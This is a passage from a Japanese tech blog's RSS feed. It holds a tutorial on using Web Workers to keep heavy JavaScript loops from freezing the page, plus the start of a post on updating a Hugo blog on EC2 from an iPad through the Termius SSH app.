&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#time&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">classList&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">remove&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>上のようなfor文で記述したスクリプトを作ってみました。&lt;br>
iの値をcounterに反映していくだけのものです。&lt;br>
まずはiの最大値を 100000 くらいで実行してみましょう。&lt;/p>
&lt;p>実行したところ、999999 と表示され、time部分の処理は 569 ミリ秒ということになります。&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="img01.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="img01.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;p>ここで注目してほしいのが、counter の文字を変化させているにも関わらず、その文字が反映されていないという点です。&lt;br>
Chrome の Developper tool で確認しても、変化しているようではありますが、画面上では反映されていません。&lt;/p>
&lt;p>重い処理を行う場合をフロントで行うと、 UX の低下につながってしまいます。&lt;br>
そこで使うのが、 Worker 処理ということになります。&lt;/p>
&lt;h2 id="workerとは">Workerとは&lt;/h2>
&lt;p>Worker とはバックグランド、つまり、裏の方で処理を行ってその結果をフロントに返却するということができる仕組みになります。&lt;/p>
&lt;p>フロントで処理を行わないので、画面ロックを発生させることなく重い処理を実行できます。&lt;br>
Worker を使用するには実行したいファイル名を指定して呼びします。&lt;/p>
&lt;p>そして、対象のワーカーに値などを &lt;strong>postMessage&lt;/strong> で値を渡します。&lt;br>
postMessage 部分は配列や連想配列のデータでも構いません。&lt;/p>
&lt;p>そして、対象のWorker側でpostされたデータを受信するように設定します。&lt;br>
受信の際はフロントであれば &lt;code>worker.addEventListener('message', (e) =&amp;gt; {})&lt;/code> を、Workerであれば &lt;code>self.addEventListener('message', (e) =&amp;gt; {})&lt;/code> を使用します。&lt;br>
処理内容を返却する際は、先ほどと同じように postMessage を使います。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript:main.js" data-lang="javascript:main.js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">worker&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Worker&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">fileName&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">worker&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">postMessage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;run&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="nx">worker&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript:worker.js" data-lang="javascript:worker.js">&lt;span class="nx">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">//処理内容
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">//処理結果を送信
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">postMessage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="uiをロックしないで行えるループ">UIをロックしないで行えるループ&lt;/h2>
&lt;p>それでは、先ほどロックしてしまったjsをworkerにしてみましょう。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript:worker_main.js" data-lang="javascript:worker_main.js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">worker&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Worker&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;worker.js&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">classList&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#counter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">worker&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">postMessage&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;run&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">worker&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">mode&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s1">&amp;#39;end&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#time&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">classList&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">remove&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#counter&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">e&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">data&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>続いて、Worker部分の処理になります。&lt;br>
worker部分ではフロントの worker_main.js から実行されたタイミングで動作を開始して、ループの値をフロントに戻すようにしてあります。&lt;br>
ループが終了すると、mode: end と終わったことを通知するようにしました。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript:worker.js" data-lang="javascript:worker.js">&lt;span class="nx">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">addEventListener&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;message&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c1">//処理内容
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">postMessage&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="nx">value&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">});&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">self&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">postMessage&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="nx">mode&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;end&amp;#39;&lt;/span>&lt;span class="p">});&lt;/span>
&lt;span class="c1">//処理結果を送信
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="kc">false&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>それでは実行してみましょう。&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="img02.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="img02.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;p>実行すると、先ほどと全く違うUIになっているかと思います。&lt;br>
実はRunを押したタイミングで、ボタンを赤くして、上の四角が回転するようにしてありました。&lt;br>
Workerなしの処理ではJavascriptの処理が詰まってしまい、その部分の処理が正しく表示されていなかったということになります。&lt;/p>
&lt;h2 id="settimeoutでもできるけどおすすめはしない">setTimeoutでもできるけど、おすすめはしない&lt;/h2>
&lt;p>UIのロックを防ぐ方法として、setTimeoutを使う方法もあります。&lt;br>
この方法はworkerを使っていないのですが、setTimeoutを使用することで別タスクとして処理させることができます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript:timer.js" data-lang="javascript:timer.js">&lt;span class="kr">const&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">classList&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">add&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">();&lt;/span>
&lt;span class="kr">const&lt;/span> &lt;span class="nx">elem&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#counter&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">let&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">100000&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">setTimeout&lt;/span>&lt;span class="p">(()=&amp;gt;{&lt;/span>
&lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="nx">elem&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">},&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">querySelector&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#time&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">start&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">classList&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">remove&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;run&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>数字部分は変化しますが、先程のようにアニメーションは行われません。&lt;br>
forの処理が先に終了してしまうため、cssのアニメーションが一瞬で終了してしまうのです。&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="img03.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="img03.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>Javascriptを使っていると思い処理も当然行う場合があります。そうしたときに、フロントで処理をしてしまうとローディングなどのアニメーションが正しく行われなかったりする原因になってしまいます。&lt;br>
Worker を使って、処理を別タスクとしてやることで正しくローディングなどを表示させることが可能です。&lt;/p>
&lt;p>重い処理を行う際は、Workerを使って別タスクで行ってユーザーにストレスを与えないサイトを作っていきましょう。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%82%b2%e3%83%bc%e3%83%a0%e3%81%a7%e5%ad%a6%e3%81%b6JavaScript%e5%85%a5%e9%96%80-HTML5-CSS%e3%82%82%e8%ba%ab%e3%81%ab%e4%bb%98%e3%81%8f-%e7%94%b0%e4%b8%ad-%e8%b3%a2%e4%b8%80%e9%83%8e/dp/4844339788/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51SCEJnrZGL.jpg" alt=" ゲームで学ぶJavaScript入門 HTML5&amp;amp;CSSも身に付く! ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> ゲームで学ぶJavaScript入門 HTML5&amp;amp;CSSも身に付く! &lt;/h2>
&lt;p> 「JavaScriptでココまでできる!」 中学生、高校生のための、ゲームプログラミング入門書の決定版! JavaScriptを使用したWebブラウザゲームの製作ノウハウを解説する入門書です。 Webページをまったく作ったことはないが、現在主流となっているブラウザゲームに興味があり、 「自分でもゲームプログラミングに挑戦してみたい!」と考えている初心者、とくに中・高校生に最適です。 本書では「より面白く」「見栄え良く」をモットーに、13本のサンプルゲームを紹介しています。 ゲームを作りながら、JavaScriptだけでなくHTML5やCSSといったWeb技術の基本もしっかり学習できます。 最後までラクに読めて、感覚的に仕組みを理解できるように、 「楽しさ」が感じられて「飽きさせない」ことを重視した構成になっています。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e7%a2%ba%e3%81%8b%e3%81%aa%e5%8a%9b%e3%81%8c%e8%ba%ab%e3%81%ab%e3%81%a4%e3%81%8fJavaScript%e3%80%8c%e8%b6%85%e3%80%8d%e5%85%a5%e9%96%80-%e7%ac%ac2%e7%89%88-%e7%8b%a9%e9%87%8e-%e7%a5%90%e6%9d%b1/dp/4815601577/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/51RXlVPRVuL.jpg" alt=" 確かな力が身につくJavaScript「超」入門 第2版 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> 確かな力が身につくJavaScript「超」入門 第2版 &lt;/h2>
&lt;p> ◎ 3万部突破のベストセラーが充実のアップデート! JavaScriptをこれから始める人にも、前に挫折したことのある人にも。 手を動かしてサンプルをひとつずつ作っていくことで、知識だけでなく、 現場で活きる、応用・実践につながる基礎力が「この一冊で」身につきます。 ポイント1「サンプルが楽しい。」 よくある“勉強のためのサンプル&amp;#34;を可能な限り排除し、「こういうの見たことある! 」「こういうのが作ってみたかった! 」というような、実際に仕事に使えそうなサンプルを集めました。なので、最初の「やるぞ! 」というモチベーションを維持したまま、最後のページまで読み進めることができます。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>パソコンは不要。スマホ、タブレットでできるブログ投稿</title><link>https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/</link><pubDate>Fri, 28 Jan 2022 15:35:18 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img11.jpg" alt="Featured image of post パソコンは不要。スマホ、タブレットでできるブログ投稿" />&lt;p>iPhoneやiPadなどのスマホ、タブレットは持ち運びに非常に便利です。パソコンよりも軽く、パソコンと同等の機能を備えてます。&lt;br>
そうした端末を使って記事が投稿できたら、スタバやドトールなどのカフェでコーヒーを飲みながら記事を書くことができてしまいます。&lt;/p>
&lt;p>今回は、AmazonのEC2上にあるHugoのブログをiPadを使って更新して見たいと思います。&lt;/p>
&lt;h2 id="iphoneやipadでターミナルを使う">iPhoneやiPadでターミナルを使う&lt;/h2>
&lt;p>iPhoneやiPadにも数多くの素晴らしいターミナルアプリがあります。&lt;br>
その中でも私が使っているのは&lt;a class="link" href="https://apps.apple.com/jp/app/termius-ssh-client/id549039908" target="_blank" rel="noopener"
>Termius: Terminal &amp;amp; SSH client&lt;/a>というアプリです。&lt;/p>
&lt;p>このアプリはターミナルの機能を持っており、SSHでのサーバ接続も可能です。もちろんログインの際にpemファイルなどを使用することも可能です。&lt;/p>
&lt;p>基本的な機能は無料で使用できるので、まずはインストールをしてみましょう。&lt;/p>
&lt;h2 id="初期設定">初期設定&lt;/h2>
&lt;p>起動すると、アカウントの登録が必要かと思いますが、必要ありません。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img01.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img01.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>下にある「Learn more」を押して、「Continue without account」にてログイン無しで使えます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img02.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img02.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>課金すると様々な機能を使えるようになるので、そういった機能でより便利に使いたい人は是非、課金してください。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img03.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img03.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>インストールが終わったら「New Hosts」をタプして、ログインしたいサーバを追加するか、「Hosts」メニューの右上にある「＋」ボタンを押してサーバを追加します。&lt;/p>
&lt;p>Alias には自分がわかりやすい名前をつけます。&lt;br>
Hostname にはサーバのドメイン名やIPアドレスを入力します。&lt;br>
Port はSSHを使うときのポートです。&lt;br>
そして、ユーザー名とパスワードを使っている人はパスワードを入力します。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img04.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img04.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>pemファイルを使っている人は、pemの内容をコピーして貼り付けるか、パソコンからpemを送信します。&lt;br>
送信はパソコンでiPadなどを接続して、ファイルタブから贈りたいpemファイルをドラッグ・アンド・ドロップします。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 180;
flex-basis: 433px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img05.jpg" data-size="980x543">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img05.jpg"
width="980"
height="543"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>pemファイルをiPadに送り終わったら、Keyを押して、左上の「+」「Import Key」にて先程送ったファイルを選択します。&lt;br>
これでキーが設定されました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img06.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img06.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>ここまで設定できたら、左上の「Save」にて保存しましょう。&lt;br>
以上でサーバに接続する準備ができました。&lt;/p>
&lt;h2 id="サーバに接続">サーバに接続&lt;/h2>
&lt;p>Alias に設定した名前でアイコンが作成されているかと思います。&lt;br>
そのアイコンを押すと、know hostsに登録するかどうか聞かれるので、「Continue」を押して追加します。&lt;br>
うまく設定できていたらサーバに接続できると思います。&lt;br>
できない場合は、アイコンを長押しして、「Edit」にて情報を正しいものに修正しましょう。&lt;/p>
&lt;h2 id="tabはどうするの">Tabはどうするの？&lt;/h2>
&lt;p>SSHではtabコマンドで入力の補完を設定しているケースがあるともいます。&lt;br>
iPadにはタブというキーがありません。さて……どうしたものでしょうか。Termius はそこもよく考えられていて、通常であれば画面をタブルタップすると「Tab」と一瞬表示されてタブキーを押したときと同様のことが行なえます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img07.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img07.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>その他にも、キーボードの上にある「…」マークを押して、「ギアーアイコン」を押すと初期のキーボード上部のボタンを変更することが可能です。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 152;
flex-basis: 365px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img08.jpg" data-size="980x644">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-28-01-wyoshi/img08.jpg"
width="980"
height="644"
loading="lazy"
alt="パソコンは不要。スマホ、タブレットでできるブログ投稿の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>Tabキーやコントロールキーが使えるとiPadでも十分使えますね。&lt;/p>
&lt;h2 id="hugoで記事を書いて確認する">hugoで記事を書いて確認する&lt;/h2>
&lt;p>hugoで記事を書くやり方は&lt;a class="link" href="http://localhost:1313/posts/2021-12-22-hugo-01-ywat/" target="_blank" rel="noopener"
>デザイナーでもできる初めてのHUGO #01&lt;/a>を参照してください。&lt;/p>
&lt;p>EC2で記事を書いて、確認しようとするとある疑問を持ってしまいます。それは確認用のサーバはどうしたら良いのかということです。&lt;br>
通常であれば「localhost:1313」などのURLで確認できます。しかし、EC2ではlocalhostとしてもEC2本体のアドレスではないので、確認できません。&lt;/p>
&lt;p>hugoにはIPを指定してサーバを起動する機能があります。&lt;/p>
